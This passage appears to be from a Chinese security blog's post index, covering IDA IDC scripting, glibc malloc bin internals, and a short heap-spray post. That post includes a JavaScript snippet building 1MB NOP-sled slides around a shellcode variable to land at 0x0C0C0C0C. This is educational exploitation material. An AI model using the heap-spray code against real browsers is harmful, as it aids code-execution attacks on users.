result&#125;static useFunc(func, arg)&#123; func(arg); // func here is expected to be a function reference&#125;static main()&#123; auto f = getFunc(); f(&quot;Hello world!\\n&quot;); // invoke the returned function f useFunc(f, &quot;XXS&quot;); // no need for &amp; operator, functions always call-by-reference&#125; 1.5 IDC对象IDC定义了一个成为object的根类，最终所有类都是由它衍生而来，并且在创建新类时支持单一继承。IDC并不使用访问说明符，如public或private，所有类成员均为有效公共类。类声明仅包含类成员函数的定义。要在类中创建数据成员，只需要创建一个给数据成员赋值的赋值语句即可。 123456789101112131415161718class ExampleClass&#123; ExampleClass(x,y)&#123; // constructor this.a = x; // all ExampleClass objects hava data member a this.b = y; // all ExampleClass objects hava data member b &#125; ~ExampleClass()&#123; // destructor &#125; foo(x)&#123; this.a = this.a + x; &#125;&#125;staic main()&#123; /* ExampleClass ex;*/ // this is not a valid variable declaration auto ex = ExampleClass(1,2); // this is right ex.foo(10); ex.z = &quot;string&quot;; // object ex now has a member z, BUT class does not&#125; 1.6 IDC程序需要有主函数，并且主程序文件还必须包含idc.idc文件以获得它包含的有用宏定义。 1234#include &lt;idc.idc&gt; // useful include directivestatic main()&#123; // do something&#125; IDC认可的预处理指令 #include &lt;文件&gt; #define&lt;宏名称&gt;[可选值] 创建一个宏，可以选择给它分配指定的值。IDC预定义了许多宏来测试脚本执行环境，如\\NT\\、\\LINUX\\、\\MAC\\、\\GUI\\、\\TXT\\ #ifdef&lt;名称&gt; 测试指定的宏是否存在，如果存在，可以选择处理其后的任何语句 #else 与上面的#ifdef配合使用 #endif #undef&lt;名称&gt; 删除指定宏 1.7 IDC错误处理运行IDC脚本时，可能遇到两种错误：解析错误、运行时错误。 解析错误指的是令程序无法运行的错误，包括语法错误、引用未定义变量、函数参数数量错误等。 运行时错误会使一段脚本立即终止运行。当然，当一个脚本运行时间过长，也会发生运行时错误。 调试IDC脚本很麻烦，除了大量使用输出语句外，没有其他办法调试IDC脚本。 1.8 IDC永久数据存储前面提到IDC没有传统意义上的数据，即声明一个大型存储块，然后使用下标访问块中的数据项的数组。但是IDC确实有全局永久数组，这可以看成已命名的永久对象，而且这些对象是稀疏数组。数组中的同时保存一个整数值和一个字符串值，IDC的全局数组无法存储浮点值。 long CreateArray(string name) 返回数组句柄 long GetArrayId(string name) 返回索引句柄 long SetArrayLong(long id, long idx, long value) 将整数value存储到数组id中idx位置 long SetArrayString(long id, long idx, string str) string or long GetArrayElement(long tag, long id, long idx) 提取的是整数还是字符串，有tag参数的值决定，必须是常量AR_LONG（整数）或AR_STR（字符串） long DelArrayElement(long tag, long id, long idx) void DeleteArray(long id) 删除句柄id对应的数组 long RenameArray(long id, string newname) 2、IDC的常用函数2.1 读取和修改数据的函数 long Byte(long addr) 从虚拟地址addr中读取一个字节值 long Word(long addr) 从虚拟地址addr中读取一个字（2字节）值 long Dword(long addr) 从虚拟地址addr中读取一个双字（4字节）值 void PatchByte(long addr, long val) 设置虚拟地址addr处的一个字节值 void PatchWord(long addr, long val) 设置虚拟地址addr处的一个字值 void PatchDword(long addr, long val) 设置虚拟地址addr处的一个双字值 bool isLoaded(long addr) 如果addr包含有效数据，则返回1，否则0 需要注意的是，我们在做这种操作的时候应该考虑字节顺序。 2.2 用户交互函数 void Message(string format, ...) 格式化打印。接受printf风格的格式化字符串 void print(...) 在输出窗口打印每个参数的字符串表示形式 void Wording(string format, ...) 对话框中显示一条格式化信息 string AskStr(string default, string prompt) 显示一个输入框，要求用户输入一个额字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0 string AskFile(long doSave, string mask, string prompt) 显示一个文件选择对话框，以简化选择文件的任务。新文件保存数据(doSave=1)，或选择现有的文件读取数据(doSave=0)。可以根据mask（如*.*或*.idc）过滤显示的文件列表。如果操作成功，则会返回选定文件的名称；如果对话框被取消，返回0 string AskYN(long default, string prompt) 用是或否的问题提示用户。突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个选定答案的整数。 long ScreenEA() 返回当前光标所在位置的虚拟地址 bool Jump(long addr) 跳转到反汇编窗口的指定地址 2.3 字符串操纵函数 string form(string format, ...) //preIDA5.6 类似c语言的sprintf函数，返回一个新年字符串，该字符串根据所提供的格式化字符串和值进行格式化 string sprintf(string format, ...) //IDA5.6+ sprintf用于替代form long atol(string val) 将十进制值val转化成对应的整数值 long xtol(string val) 将十六进制值val（可选择以0x开头）转换成对应的整数值 string ltoa(long val, long radix) 以指定的radix(2、8、10或16)返回val的字符串值 string ord(string ch) 返回单字符字符串ch的ASCII值 long strlen(string str) 返回所提供字符串的长度 long strstr(string str, string substr) 返回str中substr的索引，如果没有发现子字符串，则返回-1 string substr(string str, long start, long end) 返回包含str中由start到end-1位置的字符的子字符串。如果使用分片，此字符串等同于str[start:end] 2.4 文件输入/输出函数 long fopen(string filename, string mode) 返回一个整数文件句柄（如果发生错误，则返回0），供所有IDC文件 输入/输出函数使用。mode参数与C语言的fopen函数使用相同的模式(r,w,等) void fclose(long handle) 关闭fopen中文件句柄指定的文件 void filelength(long handle) 返回指定文件的长度，如果发生错误，则返回-1 long fgetc(long handle) 从给定文件中读取一个字节。如果发生错误，则返回-1 long fputc(long val, long handle) 写入一个字节到指定文件中，如果操作成功，则返回0；如果发生错误，则返回-1 long fprintf(long handle, string format, ...) 将格式化字符串写入到指定文件中 long writestr(long handle, string str) 将指定的字符串写入到给定文件中 string/long readstr(long handle) 从给定文件中读取一个字符串。这个函数读取到下一个换行符位置的所有字符（包括非ASCII字符），包括换行符本身（ASCII 0x0a）。操作成功，返回字符串；如果读到文件结尾，则返回-1 long writelong(long handle, long val, long bigendian) 使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个4字节整数写入到指定文件 long readlong(long handle, long bigendian) 使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个4字节整数 long writeshort(long handle, long val, long bigendian) 使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个2字节整数写入到指定文件 long readshort(long handle, long bigendian) 使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个2字节整数 bool loadfile(long handle, long pos, long addr, long length) 从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中 bool savefile(long handle, long pos, long addr, long length) 将以addr数据库地址开头的length数量的字节写入到给定文件的pos位置 2.5 操纵数据库名称 string Name(long addr) 返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不敢回用户定义的名称 string NameEx(long from, long addr) 返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称。 bool MakeNameEx(long addr, string name, long flags) 将给定的名称分配给给定的地址。改名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的MakeNameEx文档中记载描述，可以用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出。 long LockByName(string name) 返回一个位置（名称已给定）的地址。如果数据库中没有该名称，则返回BADADDR(-1) long LockByNameEx(long funcaddr, string localname) 在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR（-1） 2.6 处理函数的函数 long GetFunctionAttr(long addr, long attrib) 返回包含给定地址的函数的被请求的属性。文档中有属性常量。如要查找一个函数的结束地址，可以使用GetFunctionAttr(addr, FUNCTION_END) string GetFunctionName(long addr) 返回包含给定地址的函数的名称。如果给定地址并不属于一个函数，则返回一个空字符串 long NextFunction(long addr) 返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1 long PrevFunction(long addr) 返回给定地址之前距离最近的函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1 当然，也可以通过函数名，使用LockByName函数查找函数的起始地址 2.7 代码交叉引用函数 long Rfirst(long from) 返回给定地址向其转交控制权的第一个位置。如果给定地址没有引用其他地址，则返回BADAADDR（-1） long Rnext(long from, long current) 如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址(from)转交控制权的下一个位置。如果没有其他交叉引用存在，则返回BADADDR long XrefType() 返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN（近调用）、fl_CF（远调用）、fl_JN（近跳转）、fl_JF（远跳转）和fl_F（普通顺序流） long RfirstB(long to) 返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR（-1） long RnextB(long to, long current) 如果current已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权给给定地址(to)的位置。如果不存在其他堆给定位置的交叉引用，则返回BADADDR（-1） 每次调用一个交叉引用函数，IDA都会设置一个内部IDC状态变量，指出返回的最后一个交叉引用的类型。如果需要知道你收到的交叉引用的类型，那么在调用其他交叉引用查询函数之前，必须调用XrefType函数 2.8 数据交叉引用函数 long Dfirst(long from) 返回给定地址引用一个数据值得第一个位置。如果给定地址没有引用其他地址，则返回BADADDR long Dnext(long from, long current) 如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址(from)向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，则返回BADADDR long XrefType() 返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0（提供的偏移量）、dr_w（数据写入）和dr_R（数据读取） long DfirstB(long to) 返回将给定地址作为数据引用的第一个位置。如果不存在引用给定地址的交叉引用，则返回BADADDR long DnextB(long to, long current) 如果current已经在前一次调用DfirstB或DnextB时返回，则返回将给定地址（to）作为数据引用的下一个位置。如果没有其他对给定地址的交叉引用存在，则返回BADADDR 和代码交叉引用一样，如果需要知道你收到的交叉引用的类型，那么在调用另一个交叉引用查询函数之前，必须调用XrefType函数 2.9 数据库操纵函数 void MakeUnkn(long addr, long flags) 取消位于指定地址的项的定义。这里的标志指出是否也取消随后的想的定义，以及是否删除任何与取消定义的项有关的名称。 long MakeCode(long addr) 将位于指定地址的字节转换成一条指令 long MakeByte(long addr) 将位于指定地址的项目转换成一个数据字节 long MakeWord(long addr) long MakeDword(long addr) bool MakeComm(long addr, string comment) 在给定的地址处添加一条常规注释 bool MakeFunction(long begin, long end) 将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-1），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址 bool MakeStr(long begin, long end) 创建一个当前字符串(由GetStringType返回)类型的字符串，涵盖由begin到end-1之间的所有字节。如果end被指定为BADADDR，IDA会尝试自动确定字符串的结束地址 2.10 数据库搜索函数三个最常见的标志为 SEARCH_DOWN 搜索操作扫描高位地址 SEARCH_NEXT 略过当前匹配项，扫描下一个匹配项 SEARCH_CASE 区分大小写的方式进行二进制和文本搜索 long FindCode(long addr, long flags) 从给定的地址搜索一条指令 long FindDate(long addr, long flags) 从给定的地址搜索一个数据项 long FindBinary(long addr, long flags, string binary) 从给定的地址搜索一个字节序列。字符串binary指定一个十六进制字节序列值。如果没有设置SEARCH_CASE，且一个字节值指定一个大写或小写ASCII字母，则搜索仍然会匹配对应的互补值。例如&quot;41 42&quot;将匹配&quot;61 62&quot;、&quot;61 42&quot;等 long FindText(long addr, long flags, long row, long column, string text) 在约定的地址，从给定行(row)的给定列搜索字符串text。注意，某个给定地址的反汇编文本可能会跨越几行，因此要指定从哪一行开始搜索 2.11 反汇编行组件 string GetDisasm(long addr) 返回给定地址的反汇编文本。返回的文本包括任何注释，但不包括地址信息 string GetMnem(long addr) 返回位于给定地址的指令的助记符部分 string GetOpnd(long addr, long opnum) 返回给定地址的指定操作数的文本形式。IDA以0为其实编号，从左向右对操作数编号 long GetOpType(long addr, long opnum) 返回一个整数，指出给定地址的给定操作数的类型。 long GetOperandValue(long addr, long opnum) 返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型 string CommentEx(long addr, long type) 返回给定地址处的注释文本。如果type为0，则返回常规注释文本；如果type为1，则返回可重复注释的文本。如果给定地址没注释，则返回空字符串。 3、IDC脚本示例3.1 pwnable.kr中Codemap的idc脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;idc.idc&gt; static main()&#123; auto max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx; auto eax, ebx; // 依次为前三大堆块分配完成时的eax和ebx值 max_eax = 0; second_eax = 0; third_eax = 0; max_ebx = 0; second_ebx = 0; third_ebx = 0; AddBpt(0x1173E65); // 在提示位置添加断点，在IDA中该地址为0x1173E65 StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;); auto count; for(count = 0; count &lt; 999; count ++)&#123; auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1); eax = GetRegValue(&quot;EAX&quot;); // 中断时得到所需的值 ebx = GetRegValue(&quot;EBX&quot;); // 判断是否应刷新前三大堆块的值 if(max_eax &lt; eax)&#123; third_eax = second_eax; third_ebx = second_ebx; second_eax = max_eax; second_ebx = max_ebx; max_eax = eax; max_ebx = ebx; &#125;else if(second_eax &lt; eax)&#123; third_eax = second_eax; third_ebx = second_ebx; second_eax = eax; second_ebx = ebx; &#125;else if(third_eax &lt; eax)&#123; third_eax = eax; third_ebx = ebx; &#125; &#125; // 输出 Message(&quot;max eax: %d, ebx: %x, second eax: %d, ebx: %x, third eax: %d, ebx: %x\\n&quot;, max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx); &#125; AddBpt(0x1173E65) 设置断点 StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;) 这里是直接启用本地调试器 auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1) eax = GetRegValue(&quot;EAX&quot;); // 中断时得到所需的值","tags":[{"name":"ida","slug":"ida","permalink":"http://yoursite.com/tags/ida/"},{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"Linux堆内存管理深入分析（下）","date":"2017-09-15T11:31:03.000Z","path":"2017/09/15/Linux堆内存管理深入分析（下）/","text":"0 前言回顾在上一篇文章中（链接见文章底部），详细介绍了堆内存管理中涉及到的基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。通过前面的介绍，我们知道使用隐式链表来管理内存chunk总会涉及到内存的遍历，效率极低。对此glibc malloc引入了显示链表技术来提高堆内存分配和释放的效率。 所谓的显示链表就是我们在数据结构中常用的链表，而链表本质上就是将一些属性相同的“结点”串联起来，方便管理。在glibc malloc中这些链表统称为bin，链表中的“结点”就是各个chunk，结点的共同属性就是： 均为free chunk； 同一个链表中各个chunk的大小相等(有一个特例，详情见后文)。 1 bin介绍如前文所述，bin是一种记录free chunk的链表数据结构。系统针对不同大小的free chunk，将bin分为了4类：1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin。 在glibc中用于记录bin的数据结构有两种，分别如下所示： fastbinsY: 这是一个数组，用于记录所有的fast bins； bins: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是： bin 1 为unsorted bin; bin 2 到63为small bin; bin 64到126为large bin。 其中具体数据结构定义如下： 123456789101112struct malloc_state&#123; …… /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; …… /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; // #define NBINS 128 ……&#125;;这里mfastbinptr的定义：typedef struct malloc_chunk *mfastbinptr;mchunkptr的定义：typedef struct malloc_chunk* mchunkptr; 画图更直观： 那么处于bins中个各个free chunk是如何链接在一起的呢？回顾malloc_chunk的数据结构： 1234567891011struct malloc_chunk &#123; /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* 这两个指针只在free chunk中存在*/ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 其中的fd和bk指针就是指向当前chunk所属的链表中forward或者backward chunk。 2 Fast bin既然有fast bin，那就肯定有fast chunk——chunk size为16到80字节的chunk就叫做fast chunk。为了便于后文描述，这里对chunk大小做如下约定： 1) 只要说到chunk size，那么就表示该malloc_chunk的实际整体大小； 2) 而说到chunk unused size，就表示该malloc_chunk中刨除诸如prev_size, size, fd和bk这类辅助成员之后的实际可用的大小。因此，对free chunk而言，其实际可用大小总是比实际整体大小少16字节。 在内存分配和释放过程中，fast bin是所有bin中操作速度最快的。下面详细介绍fast bin的一些特性： 1) fast bin的个数——10个 2)每个fast bin都是一个单链表(只使用fd指针)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推，如图所示。 在main arena中Fast bins(即数组fastbinsY)的整体操作示意图如下图所示： ​ 图2-1 fast bin示意图 3) chunk size：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此默认情况下大小为16到80字节的chunk被分类到fast chunk。详情如上图 4) 不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。 5) malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理： 12345678910111213/* Maximum size of memory handled in fastbins. */static INTERNAL_SIZE_T global_max_fast; /* offset 2 to use otherwise unindexable first 2 bins *//*这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8，fastbin_index就是根据要malloc的size来快速计算该size应该属于哪一个fast bin，即该fast bin的索引。因为fast bin中chunk是从16字节开始的，所有这里以8字节为单位(32位系统为例)有减2*8 = 16的操作！*/#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) /* The maximum fastbin request size we support */#define MAX_FAST_SIZE (80 * SIZE_SZ / 4) #define NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1) 那么fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能： 首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。 然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin(见下面代码中的※1部分)： 12345678910111213141516171819202122232425262728293031323334353637static void *_int_malloc (mstate av, size_t bytes)&#123; …… /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; ※1 idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp = *fb; do &#123; victim = pp; if (victim == NULL) break; &#125; ※2 while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim); if (victim != 0) &#123; if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) &#123; errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; &#125; check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户，见上面代码※2处。 6) free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。 3 Unsorted bin当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中(为什么，在什么情况下会发生这种事情呢？详情见后文)，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。 Unsorted bin的特性如下： 1) unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。 2) Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。 4 Small bin小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。 Small bin的特性如下： 1) small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。 2) chunk size: 同一个small bin中所有chunk大小是一样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 = 508字节。 3) 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。 4) malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。 那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下： 12345678910111213malloc_init_state (mstate av)&#123; int i; mbinptr bin; /* Establish circular links for normal bins */ for (i = 1; i &lt; NBINS; ++i) &#123; bin = bin_at (av, i); bin-&gt;fd = bin-&gt;bk = bin; &#125;……&#125; 注意在malloc源码中，将bins数组中的第一个成员索引值设置为了**1**，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理…)。从上面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。 过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk，否则就需要交给unsorted bin及之后的逻辑来处理了。 5) free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中。 5 Large bin大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。 Large bin的特性如下： 1) large bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置。 在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。 鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行从大到小的排列：最大的chunk放在链表的front end，最小的chunk放在rear end。 2) 合并操作：类似于small bin。 3) malloc(large chunk)操作： 初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。 如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过binmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。 4) Free(large chunk)：类似于small chunk。 了解上面知识之后，再结合下图5-1，就不难理解各类bins的处理逻辑了： 6 总结至此glibc malloc中涉及到的所有显示链表技术已经介绍完毕。鉴于篇幅和精力有限，本文没能详细介绍完所有的技术细节，但是我相信带着这些知识点再去研究glibc malloc的话，定能起到事半功倍的效果。 另外，就我个人所了解到的基于堆溢出攻击而言，掌握以上知识，已经足够理解绝大部分堆溢出攻击技术了。因此，后面的文章将会结合这些知识详细介绍各个攻击技术的实现原理。 老规矩：如有错误，欢迎斧正！ 作者：走位@阿里聚安全，更多安全技术文章，请点击阿里聚安全博客","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"Heap Spray: 堆与栈的协同攻击","date":"2017-09-10T03:27:08.000Z","path":"2017/09/10/Heap-Spray-堆与栈的协同攻击/","text":"针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞 当浏览器或其使用ActiveX空间中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞。 不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP 有时我们可能很难在浏览器中复杂的内存环境中布置完整的shellcode 页面中的Javascript可以申请堆内存，因此把shellcode通过Javascript布置在堆中成为可能 在使用Heap Spray，一般会将EIP指向堆区的0x0C0C0C0C位置，然后用JavaScript申请大量堆内存，并用包含着0x90的“内存片”覆盖这些内存 通常JavaScript从内存地址向内存高址分配内存，因此申请的内存超过200MB（200MB=200 X 1024 X 1024=0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C将被含有shellcode的内存片覆盖。只要内存片中的0x90能够命中0x0C0C0C0C位置，shellcode就能执行。 可以用下面的方式覆盖内存 123456789101112var nop=unescape(&quot;%u9090%u9090&quot;);while (nop.length &lt;= 0x100000/2)&#123; nop += nop;&#125;//生成一个1MB充满0x90的数据块nop = nop.substring(0, 0x100000/2 -32/2 -4/2 -shellcode.length -2/2);var slide = new Arrat();for (var i=0; i &lt; 200; i++)&#123; slide[i] = nop + shellcode;&#125; 每个内存片1MB 首先产生一个1MB且全为0x90的内存块 JavaScript会添加一些额外信息，得减去。堆块信息 32字节； 字符串长度 4字节； 结束符 2个字节的NULL","tags":[{"name":"heap-spray","slug":"heap-spray","permalink":"http://yoursite.com/tags/heap-spray/"}]},{"title":"Linux堆内存管理深入分析（上）","date":"2017-09-10T03:02:06.000Z","path":"2017/09/10/Linux堆内存管理深入分析（上）/","text":"前言近年来，漏洞挖掘越来越火，各种漏洞挖掘、利用的分析文章层出不穷。从大方向来看，主要有基于栈溢出的漏洞利用和基于堆溢出的漏洞利用两种。国内关于栈溢出的资料相对较多，这里就不累述了，但是关于堆溢出的漏洞利用资料就很少了。鄙人以为主要是堆溢出漏洞的门槛较高，需要先吃透相应操作系统的堆内存管理机制，而这部分内容一直是一个难点。因此本系列文章主要从Linux系统堆内存管理机制出发，逐步介绍诸如基本堆溢出漏洞、基于unlink的堆溢出漏洞利用、double free、use-after-free等等常见的堆溢出漏洞利用技术。 前段时间偶然学习了这篇文章： https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/ 该文是我近段时间以来读到的最好文章之一，文章浅显易懂，条例清晰，作为初学者的我从中学到了很多linux堆内存管理相关的知识。但是估计由于篇幅的限制，该文对很多难点一带而过，造成部分知识点理解上的困难。因此我决定以该文为蓝本，结合其他参考资料和自己的理解，写一篇足够详细、完整的linux堆管理介绍文章，希冀能够给其他初学者献上微末之力。所以就内容来源而言，本文主要由两部分组成：一部分是翻译的上面提及的文章；另一部分是笔者结合其他参考资料和自己的理解添加的补充说明。鉴于笔者知识能力上的不足，如有问题欢迎各位大牛斧正！ 同样的，鉴于篇幅过长，我将文章分成了上下两部分，上部分主要介绍堆内存管理中的一些基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。后半部分主要介绍glibc malloc为了提高堆内存分配和释放的效率，引入的显示链表技术，即binlist的概念和核心原理。其中使用到的源码在： 